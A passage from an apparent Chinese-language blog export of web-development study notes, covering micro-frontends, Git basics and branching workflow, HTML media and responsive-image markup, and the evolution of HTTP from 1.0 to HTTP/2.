    <url>/2021/09/21/FrontendTech/</url>
    <content><![CDATA[<h2 id="前端趋势"><a href="#前端趋势" class="headerlink" title="前端趋势"></a>前端趋势</h2><p>目前有走向微前端的趋势，所谓微前端的提出，可以说是在MPA（多页）和SPA（单页）之间的折中，现今大多数网站都采用SPA，然而随着时间的推移，SPA内的东西越来越多，并且由于各部分之间的耦合性，使得维护成本越来越高。</p>
<a id="more"></a>

<p>因此微前端的概念被提出，即降低内部的耦合性，实现类似高内聚低耦合的效果。目前流行的有Web-Component，将网页各部分模块化，各模块之间互不干扰，独立工作（例如各模块甚至可以使用不同的编程语言来编写）。（PS: 这一概念可以与后端的微服务对比参考）</p>
]]></content>
      <categories>
        <category>FrontEnd/前端</category>
      </categories>
      <tags>
        <tag>CONCEPT</tag>
      </tags>
  </entry>
  <entry>
    <title>Git快速入门篇</title>
    <url>/2022/05/26/Git%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E7%AF%87/</url>
    <content><![CDATA[<p>最近在某互联网公司实习，日常工作经常会使用到 Git，因为团队协作离不开Git，所以对于新人来说，我们需要对 Git 的基本操作非常熟悉，并且对其基本原理有一定的把握。本章将主要介绍 <strong>Git 的基本概念和操作</strong>，在之后的章节中我们也会对 GitLab 的配置做详细的介绍，因为公司团队协作用的主要就是 GitLab。</p>
<a id="more"></a>

<h1 id="Git快速入门篇"><a href="#Git快速入门篇" class="headerlink" title="Git快速入门篇"></a>Git快速入门篇</h1><h2 id="1-Git基础"><a href="#1-Git基础" class="headerlink" title="1. Git基础"></a>1. Git基础</h2><p>Git是一款<strong>分布式版本控制工具</strong>，常用于管理软件代码版本。</p>
<h3 id="1-2-Git文件的状态"><a href="#1-2-Git文件的状态" class="headerlink" title="1.2 Git文件的状态"></a>1.2 Git文件的状态</h3><p><img src="/pic/Git.png" alt="Git"></p>
<table>
<thead>
<tr>
<th>未加入Git</th>
<th>工作区Working Directory</th>
<th>暂存区Staging Area</th>
<th>本地仓库Repository</th>
</tr>
</thead>
<tbody><tr>
<td>未跟踪或者被.gitignore忽略的文件</td>
<td>修改过的且被Tracked的文件</td>
<td>修改过的文件在 git add 之后会暂存到暂存区。暂存区的文件会形成快照，为后面提交做准备。</td>
<td>暂存区的文件在 git commit 之后会保存到本地仓库，并形成 commit 信息，包括：完整快照、时间、提交人信息、log等。</td>
</tr>
<tr>
<td>未跟踪的文件通常显示为红色</td>
<td>工作区的文件通常显示为红色</td>
<td>暂存区的文件通常显示为绿色</td>
<td></td>
</tr>
<tr>
<td>Untracked(未跟踪)</td>
<td>Modified(已修改)</td>
<td>Staged(已暂存)</td>
<td>Committed(已提交)</td>
</tr>
</tbody></table>
<h3 id="1-3-本地仓库和远程仓库"><a href="#1-3-本地仓库和远程仓库" class="headerlink" title="1.3 本地仓库和远程仓库"></a>1.3 本地仓库和远程仓库</h3><p><img src="/pic/Git1.png" alt="Git1"></p>
<h3 id="1-4-分支Branch"><a href="#1-4-分支Branch" class="headerlink" title="1.4 分支Branch"></a>1.4 分支Branch</h3><p>分支是 Git 中最重要的概念，通常每个仓库都有一个 master 分支。</p>
<ul>
<li>分支可以让工作并行，不同分支的工作不会相互影响</li>
<li>两个分支合并时可能会出现冲突，解决冲突之后才能完成合并</li>
</ul>
<h2 id="2-Git常用命令"><a href="#2-Git常用命令" class="headerlink" title="2. Git常用命令"></a>2. Git常用命令</h2><h3 id="2-1-Create-repositories"><a href="#2-1-Create-repositories" class="headerlink" title="2.1 Create repositories"></a>2.1 Create repositories</h3><ul>
<li><p>git init</p>
<blockquote>
<p>Turn an existing directory into a git repository</p>
<p>将当前的文件夹初始化为 git 本地仓库</p>
</blockquote>
</li>
<li><p>git clone</p>
<blockquote>
<p>Clone a repository that exists on GitHub, including all of the files, branches, and commits</p>
<p>将 GitHub 上的仓库拷贝到本地</p>
</blockquote>
</li>
</ul>
<h3 id="2-2-gitignore"><a href="#2-2-gitignore" class="headerlink" title="2.2 .gitignore"></a>2.2 .gitignore</h3><p>The <code>.gitignore</code> file are used to exclude files from being tracked with Git.</p>
<p><code>gitignore</code> 文件用来设置一些文件不被 Git 所管理。</p>
<h3 id="2-3-Branches"><a href="#2-3-Branches" class="headerlink" title="2.3 Branches"></a>2.3 Branches</h3><table>
<thead>
<tr>
<th>CMD</th>
<th>Function</th>
</tr>
</thead>
<tbody><tr>
<td>git branch [branch-name]</td>
<td>新建分支</td>
</tr>
<tr>
<td>git checkout [branch-name]</td>
<td>切换到指定分支</td>
</tr>
<tr>
<td>git merge [branch-name]</td>
<td>合并指定分支到当前分支</td>
</tr>
<tr>
<td>git branch -d [branch-name]</td>
<td>删除指定分支</td>
</tr>
</tbody></table>
<h3 id="2-4-Snchronize-changes"><a href="#2-4-Snchronize-changes" class="headerlink" title="2.4 Snchronize changes"></a>2.4 Snchronize changes</h3><table>
<thead>
<tr>
<th>CMD</th>
<th>Function</th>
</tr>
</thead>
<tbody><tr>
<td>git fetch</td>
<td>从远程分支下载所有历史记录</td>
</tr>
<tr>
<td>git merge</td>
<td>合并远程分支到当前本地分支</td>
</tr>
<tr>
<td>git push</td>
<td>上传本地分支的 commits 到 GitHub</td>
</tr>
<tr>
<td>git pull</td>
<td>更新本地工作分支，使其与远程相应的分支同步，它是 git fetch 和 git merge 的结合</td>
</tr>
</tbody></table>
<h2 id="3-Git-Workflow"><a href="#3-Git-Workflow" class="headerlink" title="3. Git Workflow"></a>3. Git Workflow</h2><p><strong>经典分支模型：</strong></p>
<table>
<thead>
<tr>
<th>分支</th>
<th>说明</th>
<th>命名规范</th>
<th>checkout from</th>
<th>merge to</th>
</tr>
</thead>
<tbody><tr>
<td>master</td>
<td>主干，最稳定的分支，可随时用作release发版，只能从其他分支合入，不能在上面做任何提交</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>develop</td>
<td>开发主干，是稳定的最新的分支。主要合并其他的分支如 feature 分支和 bugfix 分支</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>feature</td>
<td>新功能分支</td>
<td>feature/*</td>
<td>develop</td>
<td>develop</td>
</tr>
<tr>
<td>release</td>
<td>发布分支，对应一次新版本的发布，只接受 bugfix</td>
<td>release/*</td>
<td>develop</td>
<td>develop, master</td>
</tr>
<tr>
<td>hotfix</td>
<td>紧急修复分支，生产环境中发现的紧急 bug 的修复</td>
<td>hotfix/*</td>
<td>master, release</td>
<td>develop, master</td>
</tr>
</tbody></table>
<p><img src="/pic/GitWorkFlow.png" alt="GitWorkFlow"></p>
<h2 id="4-经典场景"><a href="#4-经典场景" class="headerlink" title="4. 经典场景"></a>4. 经典场景</h2><h3 id="4-1-多人协作"><a href="#4-1-多人协作" class="headerlink" title="4.1 多人协作"></a>4.1 多人协作</h3><p>基本步骤如下：</p>
<ol>
<li>克隆仓库</li>
<li>如果远程分支被其他人的分支合并更新，则需要拉取远程分支，合并更新当前的本地分支</li>
<li>推送更新</li>
</ol>
<h3 id="4-2-回滚"><a href="#4-2-回滚" class="headerlink" title="4.2 回滚"></a>4.2 回滚</h3><table>
<thead>
<tr>
<th>命令</th>
<th>方法</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>git reset [hashValue]</td>
<td>恢复到某一次提交</td>
<td>将该次提交之后的所有提交都丢弃（HEAD 指针会移动到指定的那一次提交，并丢弃之后的提交）</td>
</tr>
<tr>
<td>git revert [hashValue]</td>
<td>恢复某一次提交</td>
<td>将某一次提交的修改恢复回去（HEAD 指针会在当前提交之后创建一个新的提交并移动到该位置，该新的提交的状态与指定的某一次的提交的状态一致）</td>
</tr>
<tr>
<td>git reflog</td>
<td>与 git reset 结合使用</td>
<td>用 git reflog 查看所有 git 相关操作的记录，包括对应的 Hash 值，然后搭配 git reset 可以恢复到任意位置</td>
</tr>
</tbody></table>
<h3 id="4-3-重写历史"><a href="#4-3-重写历史" class="headerlink" title="4.3 重写历史"></a>4.3 重写历史</h3><table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>git commit –amend</td>
<td>修改最后一次提交</td>
</tr>
<tr>
<td>git rebase -i</td>
<td>1. 修改多个提交信息 2. 重新排序提交 3. 压缩提交 4. 拆分提交</td>
</tr>
</tbody></table>
<h2 id="Git-相关资料"><a href="#Git-相关资料" class="headerlink" title="Git 相关资料"></a>Git 相关资料</h2><ul>
<li><p>Git  官方手册——<a href="https://git-scm.com/docs">https://git-scm.com/docs</a></p>
</li>
<li><p>Git 可视化学习——<a href="https://learngitbranching.js.org/?locale=zh_CN">https://learngitbranching.js.org/?locale=zh_CN</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>FrontEnd/前端</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>HTML基础---学习手记</title>
    <url>/2021/09/22/HTMLNotes/</url>
    <content><![CDATA[<p><strong>关于HTML一些生疏和不常见的知识，简单汇总一下。</strong></p>
<a id="more"></a>

<h2 id="HTML布局元素"><a href="#HTML布局元素" class="headerlink" title="HTML布局元素"></a>HTML布局元素</h2><blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&gt;<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">header</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"> <span class="tag">&lt;<span class="name">nav</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"> <span class="tag">&lt;<span class="name">main</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">article</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">article</span>&gt;</span></span><br><span class="line">   </span><br><span class="line">   <span class="tag">&lt;<span class="name">aside</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">aside</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">main</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"> <span class="tag">&lt;<span class="name">footer</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line">&gt;<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="../pic/Layout.jpg" alt="Layout"></p>
</blockquote>
<h2 id="多媒体嵌入"><a href="#多媒体嵌入" class="headerlink" title="多媒体嵌入"></a>多媒体嵌入</h2><h3 id="图片—img"><a href="#图片—img" class="headerlink" title="图片—img"></a>图片—img</h3><p> 为图片提供一个语义容器，在标题和图片之间建立清晰的关联，使用HTML5 的<figure>和<figcaption>元素。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">figure</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;address&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;当图片无法显示时&quot;</span> <span class="attr">title</span>=<span class="string">&quot;当鼠标悬浮在图片时说明图片&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">figcaption</span>&gt;</span>说明图片的描述文字<span class="tag">&lt;/<span class="name">figcaption</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">figure</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="视频和音频—video-amp-audio"><a href="#视频和音频—video-amp-audio" class="headerlink" title="视频和音频—video&amp;audio"></a>视频和音频—video&amp;audio</h2><h3 id="Video"><a href="#Video" class="headerlink" title="Video"></a>Video</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">&quot;视频资源地址&quot;</span> <span class="attr">controls</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">    不支持视频时显示</span><br><span class="line">  <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><em>controls</em> 显示浏览器提供的控件界面</p>
<h4 id="使用多个播放源以提高兼容性"><a href="#使用多个播放源以提高兼容性" class="headerlink" title="使用多个播放源以提高兼容性"></a>使用多个播放源以提高兼容性</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">controls</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;video/mp4&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;video/webm&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">    浏览器不支持该视频时显示</span><br><span class="line">  <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p> WebM 和 MP4 两种格式在目前已经足够支持大多数平台和浏览器。</p>
<h4 id="其他video特性—H5"><a href="#其他video特性—H5" class="headerlink" title="其他video特性—H5"></a>其他video特性—H5</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">controls</span> <span class="attr">width</span>=<span class="string">&quot;400&quot;</span> <span class="attr">height</span>=<span class="string">&quot;400&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">autoplay</span> <span class="attr">loop</span> <span class="attr">muted</span></span></span><br><span class="line"><span class="tag">       <span class="attr">poster</span>=<span class="string">&quot;address&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;address&quot;</span> <span class="attr">type</span>=<span class="string">&quot;video/mp4&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;address&quot;</span> <span class="attr">type</span>=<span class="string">&quot;video/webm&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>你的浏览器不支持 HTML5 视频。可点击<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;rabbit320.mp4&quot;</span>&gt;</span>此链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span>观看<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><em>poster</em>—视频的封面</p>
<h3 id="audio标签"><a href="#audio标签" class="headerlink" title="audio标签"></a>audio标签</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">controls</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;audio/mp3&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;audio/ogg&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>你的浏览器不支持 HTML5 音频时显示<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>audio没有视觉部件，所以除了不支持width、height和poster之外，它支持video所以video标签拥有的特性。</p>
<h3 id="Iframe元素—嵌入技术"><a href="#Iframe元素—嵌入技术" class="headerlink" title="Iframe元素—嵌入技术"></a>Iframe元素—嵌入技术</h3><p>embed和object元素主要用来嵌入PDF和SVG、Flash，但现今它们都在逐渐被淘汰，只有iframe现在经常还被使用。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;address&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">width</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">height</span>=<span class="string">&quot;500&quot;</span> <span class="attr">frameborder</span>=<span class="string">&quot;0&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">allowfullscreen</span> <span class="attr">sandbox</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;address&quot;</span>&gt;</span></span><br><span class="line">    Fallback link for browsers that don&#x27;t support iframes</span><br><span class="line">  <span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>**<em>allowfullscreen:</em> **允许进行全屏展示</p>
<p><em><strong>frameborder:</strong></em> 绘制边框（推荐在CSS中用border）</p>
<p><em><strong>sandbox:</strong></em> 提高安全性</p>
<h3 id="响应式图片"><a href="#响应式图片" class="headerlink" title="响应式图片"></a>响应式图片</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">srcset</span>=<span class="string">&quot;elva-fairy-320w.jpg 320w,</span></span></span><br><span class="line"><span class="tag"><span class="string">             elva-fairy-480w.jpg 480w,</span></span></span><br><span class="line"><span class="tag"><span class="string">             elva-fairy-800w.jpg 800w&quot;</span></span></span><br><span class="line"><span class="tag">     <span class="attr">sizes</span>=<span class="string">&quot;(max-width: 320px) 280px,</span></span></span><br><span class="line"><span class="tag"><span class="string">            (max-width: 480px) 440px,</span></span></span><br><span class="line"><span class="tag"><span class="string">            800px&quot;</span></span></span><br><span class="line"><span class="tag">     <span class="attr">src</span>=<span class="string">&quot;elva-fairy-800w.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Elva dressed as a fairy&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><em><strong>srcset:</strong></em> 图像地址 固有宽度（以w为单位）</p>
<p><em><strong>sizes:</strong></em> (媒体条件) 槽的宽度（条件为真时）</p>
<p><strong>运行机制：</strong></p>
<pre><code>                1. 检查设备宽度
                2. 检查sizes列表中哪个媒体条件第一个为真
                3. 查看对应的槽宽度
                4. 加载srcset列表中最接近该槽大小的图像
</code></pre>
]]></content>
      <categories>
        <category>Frontend/前端</category>
      </categories>
      <tags>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTP&amp;网络安全篇</title>
    <url>/2021/12/06/HTTP&amp;Network/</url>
    <content><![CDATA[<p><strong>本篇文章主要针对常见的一些计算机网络概念进行梳理和总结，便于今后对于web开发的深入理解。</strong></p>
<a id="more"></a>

<h1 id="Network"><a href="#Network" class="headerlink" title="Network"></a>Network</h1><h2 id="HTTP协议篇"><a href="#HTTP协议篇" class="headerlink" title="HTTP协议篇"></a>HTTP协议篇</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>HTTP是基于TCP/IP协议的<strong>应用层协议</strong>。它不涉及数据报传输，主要规定了客服端与服务器的通信格式，默认使用80端口。</p>
<h3 id="HTTP-1-0"><a href="#HTTP-1-0" class="headerlink" title="HTTP/1.0"></a>HTTP/1.0</h3><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><ul>
<li><p>1996年——发布</p>
</li>
<li><p>1.0版本较0.9版本中只有GET命令的情况，还引入了POST和HEAD命令。</p>
</li>
<li><p>HTTP请求和回应格式，除了包括<strong>数据部分</strong>还必须包括<strong>头信息即HTTP HEADER</strong>（用来描述元数据）</p>
</li>
</ul>
<h4 id="请求格式"><a href="#请求格式" class="headerlink" title="请求格式"></a>请求格式</h4><p>请求命令+多行头信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.0 请求命令</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_10_5) 多行头信息</span><br><span class="line">Accept: *&#x2F;* 多行头信息</span><br></pre></td></tr></table></figure>
<h4 id="回应格式"><a href="#回应格式" class="headerlink" title="回应格式"></a>回应格式</h4><p>头信息+空行+数据。第一行为协议版本+状态码+状态描述</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.0 200 OK 第一行</span><br><span class="line">Content-Type: text&#x2F;plain  从这儿开始是头信息</span><br><span class="line">Content-Length: 137582</span><br><span class="line">Expires: Thu, 05 Dec 1997 16:00:00 GMT</span><br><span class="line">Last-Modified: Wed, 5 August 1996 15:55:28 GMT</span><br><span class="line">Server: Apache 0.84</span><br><span class="line">        											这个是空行</span><br><span class="line">&lt;html&gt;												从这儿开始是数据</span><br><span class="line">  &lt;body&gt;Hello World&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<h4 id="Content-Type-字段"><a href="#Content-Type-字段" class="headerlink" title="Content-Type 字段"></a>Content-Type 字段</h4><p>头信息为ASCII码，但数据可以为任意格式。因此需要用**<code>Content-Type</code>告诉客户端该数据的格式**。</p>
<p>常见的<code>Content-Type</code>字段值如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">text&#x2F;plain</span><br><span class="line">text&#x2F;html</span><br><span class="line">text&#x2F;css</span><br><span class="line">image&#x2F;jpeg</span><br><span class="line">image&#x2F;png</span><br><span class="line">image&#x2F;svg+xml</span><br><span class="line">audio&#x2F;mp4</span><br><span class="line">video&#x2F;mp4</span><br><span class="line">application&#x2F;javascript</span><br><span class="line">application&#x2F;pdf</span><br><span class="line">application&#x2F;zip</span><br><span class="line">application&#x2F;atom+xml</span><br></pre></td></tr></table></figure>
<p>这些数据类型统称为 <strong>MIME type</strong>，格式为：一级类型/二级类型。</p>
<h4 id="Content-Encoding-字段"><a href="#Content-Encoding-字段" class="headerlink" title="Content-Encoding 字段"></a>Content-Encoding 字段</h4><p>由于<strong>发送的数据可以为任意格式</strong>，因此可以把数据压缩后再发送。**<code>Content-Encoding</code>字段说明数据的压缩方式**。常见压缩方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Encoding: gzip</span><br><span class="line">Content-Encoding: compress</span><br><span class="line">Content-Encoding: deflate</span><br></pre></td></tr></table></figure>
<p>同时<strong>客户端在请求时</strong>，可以说明自己所<strong>接受的压缩方式</strong>，使用**字段<code>Accept-Encoding</code>**。如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Accept-Encoding: gzip, deflate</span><br></pre></td></tr></table></figure>
<h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><p>HTTP/1.0 主要问题是：<strong>每个TCP连接只能发送一个请求</strong>。数据发送完毕，链接就关闭了。再请求其它资源，就必须再新建一个TCP连接。而TCP连接需要客户端与服务器三次握手，并且开始时由于slow start，速度很慢，因此新建TCP连接成本很高。</p>
<p><strong>为了解决这个问题，部分浏览器使用了非标准字段<code>Connection</code>。</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure>
<p>上面这个字段要求服务器不要关闭TCP连接，以便其它请求复用，该可复用的TCP连接直到客户端或服务器主动关闭，才会断开。但这种方法并不标准。</p>
<h3 id="HTTP-1-1"><a href="#HTTP-1-1" class="headerlink" title="HTTP/1.1"></a>HTTP/1.1</h3><p>从1997沿用至201几，直到HTTPS。</p>
<h4 id="持久连接"><a href="#持久连接" class="headerlink" title="持久连接"></a>持久连接</h4><ul>
<li>1.1版本<strong>最大的变化</strong>就是引入了<strong>持久连接（persistent connection）</strong>，即TCP连接默认不关闭，可以被多个请求复用，并且不用声明<code>Connection:keep-alive</code>。</li>
<li>客户端与服务器之间一段时间没有通信，就会主动关闭连接。但规范做法是，客户端在最后一个请求时，发送<code>Connection: close</code>，明确要求服务器关闭TCP连接。</li>
</ul>
<p><strong>注：</strong>对于同一个域名，大多数浏览器允许同时建立<strong>6个持久连接</strong>。</p>
<h4 id="管道机制"><a href="#管道机制" class="headerlink" title="管道机制"></a>管道机制</h4><p>在1.0版本中，在同一个TCP连接里，如果客户端要<strong>请求两个资源</strong>，会<strong>先发送A请求</strong>，然后等待服务器回应，<strong>收到响应</strong>之后<strong>再发送B请求</strong>。</p>
<p>在1.1版本中引入了<strong>管道机制（pipelining）</strong>，其允许浏览器<strong>同时发送A请求和B请求</strong>，但服务器还是按照顺序，先回应A请求，完成之后再回应B请求。</p>
<p>因此，管道机制使<strong>客户端可以在同一个TCP连接中同时发送多个请求</strong>。</p>
<h4 id="Content-Length-字段"><a href="#Content-Length-字段" class="headerlink" title="Content-Length 字段"></a>Content-Length 字段</h4><p><strong>用于声明本次回应的数据长度。</strong></p>
<h4 id="分块传输编码"><a href="#分块传输编码" class="headerlink" title="分块传输编码"></a>分块传输编码</h4><p>简言之，就是服务器<strong>产生一块数据就发送一块</strong>，即采用流模式（stream）取代缓存模式（buffer）。</p>
<p>因此，1.1版本可以不使用<code>Content-Length</code>字段，而使用分块传输编码（chunked transfer encoding）。只要<strong>请求或回应的头信息中有<code>Transfer-Encoding</code>字段</strong>，就表明回应将由数量未定的数据块组成。</p>
<p><strong>注：</strong>每个非空的数据块之前，会有一个16进制的数值来表示这个块的长度。最后是一个大小为0的块，表示本次回应的数据发送完毕。示例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Content-Type: text&#x2F;plain</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">25</span><br><span class="line">This is the data in the first chunk</span><br><span class="line"></span><br><span class="line">1C</span><br><span class="line">and this is the second one</span><br><span class="line"></span><br><span class="line">3</span><br><span class="line">con</span><br><span class="line"></span><br><span class="line">8</span><br><span class="line">sequence</span><br><span class="line"></span><br><span class="line">0</span><br></pre></td></tr></table></figure>
<h4 id="其它功能"><a href="#其它功能" class="headerlink" title="其它功能"></a>其它功能</h4><ul>
<li>1.1版本还新增了许多动词方法，如：<code>PUT</code>, <code>PATCH</code>, <code>HEAD</code>, <code>OPTIONS</code>, <code>DELETE</code></li>
<li>客户端请求头信息<strong>新增了<code>HOST</code>字段</strong>，用来指定服务器的域名。有了<code>HOST</code>字段就可以将请求发往同一服务器上的不同网站。（为虚拟机兴起打下基础）</li>
</ul>
<h4 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h4><p>存在<strong>队头堵塞（Head-of-line blocking）</strong>。尽管允许复用TCP连接，但在<strong>同一个TCP连接里，数据通信依然是按次序进行</strong>，服务器只有处理完第一个请求的回应，才能进行下一个请求的回应。如果前一个请求的回应很慢，那么后面就会有许多请求排队。</p>
<p>避免队头堵塞的方法有：</p>
<pre><code>1. **减少请求次数**。例如：合并脚本和样式表、将图片嵌入CSS代码
1. **同时多开持久连接**。例如：域名分片（domain sharding）即所需下载可以来自多个域，可以解决并发限制。
</code></pre>
<h3 id="HTTP-2"><a href="#HTTP-2" class="headerlink" title="HTTP/2"></a>HTTP/2</h3><h4 id="二进制协议"><a href="#二进制协议" class="headerlink" title="二进制协议"></a>二进制协议</h4><p>HTTP/1.1版本的头信息是文本（ASCII码），数据体是文本或二进制。但HTTP/2则是一个<strong>彻底的二进制协议</strong>，头信息和数据体都是二进制，并且统称为“帧”（frame）：头信息帧和数据帧。</p>
<p>二进制协议的好处是：可以定义额外的帧。</p>
<h4 id="多工-Multiplexing"><a href="#多工-Multiplexing" class="headerlink" title="多工 Multiplexing"></a>多工 Multiplexing</h4><p>在HTTP/2中，在同一个TCP连接中，客户端和浏览器都可以同时发送多个请求和响应，并且不用按照顺序一一对应，这就避免了队头堵塞的问题。</p>
<p>例如：在一个TCP连接中，服务器同时收到A请求和B请求，于是先回应A请求，结果发现处理十分耗时，于是就发送A请求已处理好的部分，接着处理回应B请求，完成之后，再处理发送A请求的剩下的部分。我们称这种<strong>双工的、实时的通信</strong>为<strong>多工</strong>。</p>
<h4 id="数据流"><a href="#数据流" class="headerlink" title="数据流"></a>数据流</h4><p>HTTP/2的<strong>数据包是不按顺序发送的</strong>，同一个连接里面连续的数据包，可能属于不同的回应，因此需要<strong>对数据包进行标记</strong>，指出它属于哪个回应。</p>
<p>HTTP/2将<strong>每个请求或者回应的所有数据包</strong>都称为一个<strong>数据流（stream）</strong>。每个数据流都有一个唯一的编号。数据包发送的时候，必须标记数据流ID，一标识它属于哪个数据流。此外客户端发出的数据流ID一律为奇数，服务端发出的数据流ID一律为偶数。</p>
<p>数据流发送到一半时，客户端和服务器都可以发出信号来取消这个数据流。在HTTP/1.1版本中，取消数据流发送的唯一方法是关闭TCP连接。HTTP/2可以取消某一次请求同时保证TCP连接还是开启的状态，可以被其它请求复用。</p>
<p>客户端还可以指定数据流的优先级，优先级越高，服务器会越早对其回应。</p>
